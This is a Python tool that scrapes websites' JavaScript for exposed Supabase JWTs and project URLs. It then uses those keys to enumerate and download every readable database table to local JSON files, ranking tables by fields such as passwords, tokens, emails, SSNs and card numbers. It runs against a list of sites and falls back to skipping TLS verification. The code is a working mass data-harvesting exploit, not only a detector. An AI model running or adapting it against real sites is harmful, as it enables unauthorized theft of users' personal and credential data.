import requests
import re
import os
import json
import urllib3
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# ================== CONFIG ==================

TIMEOUT = 10
PAGE_SIZE = 1000
OUTPUT_DIR = "output"

COMMON_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; SupabaseScanner/1.0)"
}

JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
# Standard Supabase cloud URLs
SUPABASE_CLOUD_REGEX = re.compile(r'https://[a-z0-9-]+\.supabase\.co')
# Common Supabase environment variable patterns (captures URL in group 1)
SUPABASE_ENV_VAR_PATTERNS = [
    # Patterns like: NEXT_PUBLIC_SUPABASE_URL:"https://..." or SUPABASE_URL: "https://..."
    r'(?:NEXT_PUBLIC_|VITE_|REACT_APP_|PUBLIC_)?SUPABASE[_-]?URL["\']?\s*[:=]\s*["\']?(https://[^"\'\s,}]+)',
    # Patterns like: "supabaseUrl": "https://..." or supabase_url: "https://..."
    r'(?:["\']?)(?:supabaseUrl|supabase_url|supabaseURL)(?:["\']?\s*[:=]\s*["\']?)(https://[^"\'\s,}]+)',
]

# Sensitive field name patterns (case-insensitive) - must match exactly or as word boundaries
SENSITIVE_FIELD_PATTERNS = [
    # Authentication & Credentials
    r'\bemail\b',
    r'\bpassword\b', r'\bpasswd\b', r'\bpwd\b', r'\bpass\b', r'\bpassphrase\b',
    r'\bapi[_-]?key\b', r'\bapikey\b', r'\bauth[_-]?key\b', r'\bapplication[_-]?key\b',
    r'\bsecret\b', r'\bprivate[_-]?key\b', r'\bsecret[_-]?key\b', r'\bshared[_-]?secret\b',
    r'\btoken\b', r'\bjwt\b', r'\baccess[_-]?token\b', r'\brefresh[_-]?token\b',
    r'\boauth[_-]?token\b', r'\bsession[_-]?token\b', r'\bbearer[_-]?token\b',
    r'\bauth\b', r'\bauth[_-]?code\b', r'\bauthorization[_-]?code\b',
    r'\bsession[_-]?id\b', r'\bsession[_-]?key\b', r'\bsession[_-]?secret\b',
    r'\brecovery[_-]?code\b', r'\bbackup[_-]?code\b', r'\bverification[_-]?code\b',
    r'\botp\b', r'\btwo[_-]?factor\b', r'\b2fa[_-]?secret\b', r'\b2fa[_-]?code\b',
    
    # Personal Identifiers
    r'\bphone\b', r'\bphone[_-]?number\b', r'\bmobile\b', r'\btelephone\b',
    r'\bssn\b', r'\bsocial[_-]?security\b', r'\bsocial[_-]?security[_-]?number\b',
    r'\bdriver[_-]?license\b', r'\bdrivers[_-]?license\b', r'\blicense[_-]?number\b',
    r'\bpassport[_-]?number\b', r'\bpassport[_-]?id\b',
    r'\bnational[_-]?id\b', r'\bnational[_-]?identifier\b', r'\btax[_-]?id\b',
    r'\buser[_-]?id\b', r'\baccount[_-]?id\b', r'\bcustomer[_-]?id\b',
    r'\bemployee[_-]?id\b', r'\bstaff[_-]?id\b',
    
    # Financial Information
    r'\bcredit[_-]?card\b', r'\bcard[_-]?number\b', r'\bcvv\b', r'\bcvc\b', r'\bcvn\b',
    r'\bexpiry[_-]?date\b', r'\bexpiration[_-]?date\b', r'\bexp[_-]?date\b',
    r'\bbank[_-]?account\b', r'\baccount[_-]?number\b', r'\brouting[_-]?number\b',
    r'\biban\b', r'\bswift[_-]?code\b', r'\bbic\b',
    r'\bpayment[_-]?method\b', r'\bpayment[_-]?info\b', r'\bpayment[_-]?details\b',
    r'\bsalary\b', r'\bincome\b', r'\bwage\b', r'\bpayroll\b',
    
    # Location & Contact
    r'\baddress\b', r'\bstreet\b', r'\bzip\b', r'\bpostal[_-]?code\b', r'\bpostcode\b',
    r'\bhome[_-]?address\b', r'\bwork[_-]?address\b', r'\bbilling[_-]?address\b',
    r'\bip[_-]?address\b', r'\bipv4\b', r'\bipv6\b',
    r'\blocation\b', r'\bcoordinates\b', r'\bgps[_-]?coordinates\b', r'\blat\b', r'\blong\b', r'\blatitude\b', r'\blongitude\b',
    
    # Personal Information
    r'\bbirth[_-]?date\b', r'\bdob\b', r'\bdate[_-]?of[_-]?birth\b',
    r'\bgender\b', r'\brace\b', r'\bethnicity\b',
    r'\bmarital[_-]?status\b',
    
    # Health & Medical
    r'\bhealth[_-]?record\b', r'\bmedical[_-]?record\b', r'\bpatient[_-]?id\b',
    r'\binsurance[_-]?number\b', r'\bhealth[_-]?insurance\b', r'\bmedical[_-]?insurance\b',
    r'\bdiagnosis\b', r'\btreatment\b',
    
    # Device & Hardware Identifiers
    r'\bdevice[_-]?id\b', r'\bdevice[_-]?identifier\b', r'\bdevice[_-]?uuid\b',
    r'\bmac[_-]?address\b', r'\bmacaddr\b',
    r'\bimei\b', r'\bserial[_-]?number\b',
    r'\bhardware[_-]?id\b',
    
    # Digital Keys & Certificates
    r'\bprivate[_-]?key\b', r'\bpublic[_-]?key\b', r'\bcertificate\b',
    r'\bpgp[_-]?key\b', r'\bgpg[_-]?key\b', r'\bssh[_-]?key\b',
    r'\blicense[_-]?key\b', r'\bsubscription[_-]?key\b', r'\bactivation[_-]?key\b',
    
    # Biometric Data
    r'\bfingerprint\b', r'\bbiometric\b', r'\bfacial[_-]?recognition\b',
    
    # Legal & Compliance
    r'\bcase[_-]?number\b', r'\blegal[_-]?document\b',
    
    # Internal/System
    r'\binternal[_-]?note\b', r'\badmin[_-]?note\b', r'\bconfidential\b',
]

# Fields that should never be considered sensitive (common metadata fields)
# Note: These are excluded even if they contain patterns that might look sensitive
NON_SENSITIVE_FIELDS = [
    r'\bcreated[_-]?at\b', r'\bupdated[_-]?at\b', r'\bdeleted[_-]?at\b',
    r'^id$',  # Standalone "id" field only (user_id, author_id, etc. are sensitive)
    r'\bdescription\b', r'\btitle\b', r'\bname\b', r'\bcontent\b',
    r'\bcreator\b', r'\bauthor\b', r'\blinks?\b', r'\burl\b', 
    r'\bimage\b', r'\bavatar\b', r'\bsearch[_-]?vector\b', r'\bvector\b',
    r'\bauthor[_-]?links\b', r'\bexample[_-]?emails\b',  # These are example/public data
]

# Sensitive data patterns
EMAIL_REGEX = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
PHONE_REGEX = re.compile(r'[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,9}')
CREDIT_CARD_REGEX = re.compile(r'\b(?:\d{4}[-\s]?){3}\d{4}\b')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================== HTTP HELPERS ==================

def safe_get(url, headers=None, **kwargs):
    final_headers = COMMON_HEADERS.copy()
    if headers:
        final_headers.update(headers)

    try:
        return requests.get(
            url,
            headers=final_headers,
            timeout=TIMEOUT,
            **kwargs
        )
    except requests.exceptions.SSLError:
        print(f"  [!] SSL error → retrying insecure: {url}")
        try:
            return requests.get(
                url,
                headers=final_headers,
                timeout=TIMEOUT,
                verify=False,
                **kwargs
            )
        except Exception as e:
            print(f"  [-] Failed (SSL bypass): {e}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"  [-] Request failed: {e}")
        return None

# ================== JS DISCOVERY ==================

def get_js_files(site_url):
    r = safe_get(site_url)
    if not r:
        return []

    soup = BeautifulSoup(r.text, "html.parser")
    js_files = set()

    for script in soup.find_all("script", src=True):
        js_files.add(urljoin(site_url, script["src"]))

    return list(js_files)

def extract_supabase_urls(content):
    """Extract Supabase URLs from JavaScript content, including custom domains."""
    urls = set()
    
    # Extract standard .supabase.co URLs
    urls.update(SUPABASE_CLOUD_REGEX.findall(content))
    
    # Extract URLs from common Supabase environment variable patterns
    for pattern in SUPABASE_ENV_VAR_PATTERNS:
        matches = re.finditer(pattern, content, re.IGNORECASE)
        for match in matches:
            url = match.group(1) if match.lastindex else match.group(0)
            # Clean up the URL (remove trailing quotes, commas, brackets, etc.)
            url = re.sub(r'["\',)}\]]+$', '', url)
            # Remove any trailing slashes for consistency
            url = url.rstrip('/')
            if url.startswith('https://'):
                urls.add(url)
    
    # Also look for URLs near Supabase-related keywords (for custom domains)
    # Look for patterns like "supabase": "https://..." or supabaseUrl: "https://..."
    supabase_keyword_pattern = r'(?:supabase|SUPABASE)["\'\s:=]+(https://[^"\'\s,}]+)'
    matches = re.finditer(supabase_keyword_pattern, content, re.IGNORECASE)
    for match in matches:
        url = match.group(1)
        url = re.sub(r'["\',)}\]]+$', '', url)
        url = url.rstrip('/')
        if url.startswith('https://') and '.supabase.co' not in url:
            # Only add custom domains (not standard .supabase.co, already captured above)
            urls.add(url)
    
    return list(urls)

def scan_js(js_url):
    r = safe_get(js_url)
    if not r:
        return [], []

    content = r.text
    return (
        JWT_REGEX.findall(content),
        extract_supabase_urls(content)
    )

# ================== VULNERABILITY ASSESSMENT ==================

def is_non_sensitive_field(field_name):
    """Check if a field name is clearly non-sensitive (exclusion list)."""
    field_lower = field_name.lower()
    for pattern in NON_SENSITIVE_FIELDS:
        if re.search(pattern, field_lower):
            return True
    return False

def is_sensitive_field_name(field_name):
    """Check if a field name suggests sensitive data."""
    # Exclude non-sensitive fields first
    if is_non_sensitive_field(field_name):
        return False
    
    field_lower = field_name.lower()
    for pattern in SENSITIVE_FIELD_PATTERNS:
        if re.search(pattern, field_lower):
            return True
    return False

def analyze_table_for_sensitive_data(rows, max_samples=100):
    """
    Analyze table data to detect sensitive information.
    Returns dict with sensitive_fields, vulnerability_level, and details.
    """
    if not rows:
        return {
            "sensitive_fields": [],
            "vulnerability_level": "none",
            "has_sensitive_data": False,
            "details": {}
        }
    
    # Sample rows for analysis (to avoid processing huge tables)
    sample_size = min(len(rows), max_samples)
    sample_rows = rows[:sample_size]
    
    # Get all field names from first row
    if not sample_rows or not isinstance(sample_rows[0], dict):
        return {
            "sensitive_fields": [],
            "vulnerability_level": "unknown",
            "has_sensitive_data": False,
            "details": {}
        }
    
    all_fields = list(sample_rows[0].keys())
    sensitive_fields = []
    field_analysis = {}
    
    # Analyze each field
    for field in all_fields:
        field_lower = field.lower()
        
        # Skip fields that are clearly non-sensitive
        if is_non_sensitive_field(field):
            continue
        
        is_sensitive = False
        detection_reasons = []
        
        # Check field name (must explicitly match sensitive patterns)
        if is_sensitive_field_name(field):
            is_sensitive = True
            detection_reasons.append("field_name")
        
        # Check field values in sample (only if not already marked as non-sensitive)
        non_null_values = [row.get(field) for row in sample_rows if row.get(field) is not None][:10]
        
        # Check field values for sensitive data patterns
        # Only flag if field name suggests sensitivity OR if we find clear sensitive data patterns
        for value in non_null_values:
            if not isinstance(value, (str, int)):
                continue
                
            value_str = str(value)
            
            # Check for email addresses - only flag if field name contains "email"
            if EMAIL_REGEX.search(value_str) and "email" in field_lower:
                if "email_pattern" not in detection_reasons:
                    detection_reasons.append("email_pattern")
                    is_sensitive = True
            
            # Check for phone numbers - only flag if field name suggests phone
            if PHONE_REGEX.search(value_str) and len(value_str.replace('-', '').replace(' ', '').replace('(', '').replace(')', '')) >= 10:
                if ("phone" in field_lower or "mobile" in field_lower) and "phone_pattern" not in detection_reasons:
                    detection_reasons.append("phone_pattern")
                    is_sensitive = True
            
            # Check for JWTs (always sensitive, regardless of field name)
            if JWT_REGEX.search(value_str):
                if "jwt_pattern" not in detection_reasons:
                    detection_reasons.append("jwt_pattern")
                    is_sensitive = True
            
            # Check for credit card patterns (always sensitive, regardless of field name)
            if CREDIT_CARD_REGEX.search(value_str):
                if "credit_card_pattern" not in detection_reasons:
                    detection_reasons.append("credit_card_pattern")
                    is_sensitive = True
        
        if is_sensitive:
            sensitive_fields.append(field)
            field_analysis[field] = {
                "reasons": detection_reasons,
                "sample_count": len(non_null_values)
            }
    
    # Determine vulnerability level
    vulnerability_level = "none"
    if sensitive_fields:
        # Check for high-severity fields
        high_severity_patterns = [r'password', r'passwd', r'pwd', r'secret', r'api[_-]?key', r'token', r'jwt', r'credit[_-]?card', r'ssn']
        has_high_severity = any(
            re.search(pattern, field.lower()) 
            for field in sensitive_fields 
            for pattern in high_severity_patterns
        )
        
        if has_high_severity:
            vulnerability_level = "critical"
        elif any("email" in str(reason) or "phone" in str(reason) for field_data in field_analysis.values() for reason in field_data["reasons"]):
            vulnerability_level = "high"
        else:
            # If we have sensitive fields but they're not critical/high, mark as medium
            vulnerability_level = "medium"
    
    return {
        "sensitive_fields": sensitive_fields,
        "vulnerability_level": vulnerability_level,
        "has_sensitive_data": len(sensitive_fields) > 0,
        "details": field_analysis
    }

# ================== SUPABASE ENUM / DUMP ==================

def get_tables(base_url, headers):
    r = safe_get(f"{base_url}/rest/v1/", headers=headers)
    if not r or r.status_code != 200:
        raise Exception("Cannot enumerate tables")

    return [
        p.strip("/")
        for p in r.json().get("paths", {})
        if not p.startswith("/rpc") and p != "/"
    ]

def dump_table(base_url, table, headers):
    rows = []
    offset = 0

    while True:
        url = f"{base_url}/rest/v1/{table}?limit={PAGE_SIZE}&offset={offset}"
        r = safe_get(url, headers=headers)

        if not r or r.status_code != 200:
            return None, r.status_code if r else "ERR"

        chunk = r.json()
        rows.extend(chunk)

        if len(chunk) < PAGE_SIZE:
            break

        offset += PAGE_SIZE

    return rows, 200

# ================== SITE SCANNER ==================

def scan_site(site_url):
    domain = urlparse(site_url).netloc.replace("www.", "")
    site_dir = os.path.join(OUTPUT_DIR, domain)
    tables_dir = os.path.join(site_dir, "tables")

    os.makedirs(tables_dir, exist_ok=True)

    print(f"\n🌐 Scanning {site_url}")

    findings = {
        "site": site_url,
        "vulnerable": False,
        "supabase_urls": [],
        "jwts": []
    }

    js_files = get_js_files(site_url)

    for js in js_files:
        jwts, supabase = scan_js(js)
        findings["jwts"].extend(jwts)
        findings["supabase_urls"].extend(supabase)

    findings["jwts"] = list(set(findings["jwts"]))
    findings["supabase_urls"] = list(set(findings["supabase_urls"]))

    if not findings["jwts"] or not findings["supabase_urls"]:
        print("  [-] No exposed Supabase JWT found")
        write_json(site_dir, "findings.json", findings)
        return

    print("  🚨 VULNERABLE: Supabase JWT exposed")
    findings["vulnerable"] = True

    base_url = findings["supabase_urls"][0]
    jwt = findings["jwts"][0]

    supabase_headers = {
        "apikey": jwt,
        "Authorization": f"Bearer {jwt}"
    }

    summary = []

    try:
        tables = get_tables(base_url, supabase_headers)
        print(f"  [+] Found {len(tables)} tables")

        for table in tables:
            rows, status = dump_table(base_url, table, supabase_headers)

            if status == 200:
                path = os.path.join(tables_dir, f"{table}.json")
                with open(path, "w") as f:
                    json.dump(rows, f, indent=2)

                # Analyze for sensitive data
                analysis = analyze_table_for_sensitive_data(rows)
                
                # Determine if vulnerable (contains sensitive data)
                is_vulnerable = analysis["has_sensitive_data"]
                vuln_level = analysis["vulnerability_level"]
                sensitive_fields = analysis["sensitive_fields"]
                
                if is_vulnerable:
                    print(f"    🚨 {table}: {len(rows)} rows - VULNERABLE ({vuln_level}) - Sensitive fields: {', '.join(sensitive_fields)}")
                else:
                    print(f"    [+] {table}: {len(rows)} rows - Public data (no sensitive fields detected)")
                
                summary.append({
                    "table": table,
                    "rows": len(rows),
                    "dumped": True,
                    "vulnerable": is_vulnerable,
                    "vulnerability_level": vuln_level,
                    "sensitive_fields": sensitive_fields,
                    "analysis": analysis
                })
            else:
                print(f"    [-] {table}: blocked")
                summary.append({
                    "table": table,
                    "dumped": False,
                    "status": status,
                    "vulnerable": False
                })

    except Exception as e:
        print(f"  [-] Supabase error: {e}")

    # Calculate overall vulnerability assessment
    vulnerable_tables = [s for s in summary if s.get("vulnerable", False)]
    critical_tables = [s for s in vulnerable_tables if s.get("vulnerability_level") == "critical"]
    high_tables = [s for s in vulnerable_tables if s.get("vulnerability_level") == "high"]
    medium_tables = [s for s in vulnerable_tables if s.get("vulnerability_level") == "medium"]
    
    if vulnerable_tables:
        print(f"\n  ⚠️  VULNERABILITY SUMMARY:")
        print(f"     - Critical: {len(critical_tables)} table(s)")
        print(f"     - High: {len(high_tables)} table(s)")
        print(f"     - Medium: {len(medium_tables)} table(s)")
        print(f"     - Total vulnerable: {len(vulnerable_tables)}/{len([s for s in summary if s.get('dumped')])} accessible tables")
        
        if critical_tables:
            print(f"\n     Critical tables:")
            for t in critical_tables:
                print(f"       • {t['table']} - Fields: {', '.join(t.get('sensitive_fields', []))}")
    
    findings["vulnerability_summary"] = {
        "total_tables_accessible": len([s for s in summary if s.get("dumped")]),
        "vulnerable_tables_count": len(vulnerable_tables),
        "critical_count": len(critical_tables),
        "high_count": len(high_tables),
        "medium_count": len(medium_tables),
        "vulnerable_tables": [
            {
                "table": t["table"],
                "level": t.get("vulnerability_level"),
                "sensitive_fields": t.get("sensitive_fields", [])
            }
            for t in vulnerable_tables
        ]
    }

    write_json(site_dir, "summary.json", summary)
    write_json(site_dir, "findings.json", findings)

# ================== UTILS ==================

def write_json(dir_path, name, data):
    os.makedirs(dir_path, exist_ok=True)
    with open(os.path.join(dir_path, name), "w") as f:
        json.dump(data, f, indent=2)

# ================== ENTRY ==================

def parse_args():
    parser = argparse.ArgumentParser(
        description="Scan websites for exposed Supabase JWT tokens and dump accessible tables."
    )
    parser.add_argument(
        "--url",
        help="Single website URL to scan (e.g., https://example.com)"
    )
    parser.add_argument(
        "--file", "-f",
        help="File containing list of URLs to scan (one per line)"
    )
    parser.add_argument(
        "--output", "-o",
        default=OUTPUT_DIR,
        help=f"Output directory (default: {OUTPUT_DIR})"
    )
    return parser.parse_args()

def get_sites_from_file(file_path):
    """Read URLs from a file, one per line."""
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File not found: {file_path}")
    
    with open(file_path, "r") as f:
        sites = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    
    return sites

def main():
    args = parse_args()
    global OUTPUT_DIR
    OUTPUT_DIR = args.output
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    sites = []

    # Determine which sites to scan
    if args.url:
        # Single URL mode
        sites = [args.url]
    elif args.file:
        # File mode
        sites = get_sites_from_file(args.file)
        if not sites:
            print(f"[-] No URLs found in {args.file}")
            return
    elif os.path.exists("sites.txt"):
        # Fallback to sites.txt if it exists
        sites = get_sites_from_file("sites.txt")
        if not sites:
            print("[-] sites.txt is empty")
            return
    else:
        print("[-] No input provided. Use --url to scan a single site or --file to scan from a file.")
        print("    Alternatively, create a sites.txt file with URLs (one per line).")
        return

    print(f"[*] Scanning {len(sites)} site(s)\n")

    for site in sites:
        scan_site(site)

if __name__ == "__main__":
    main()

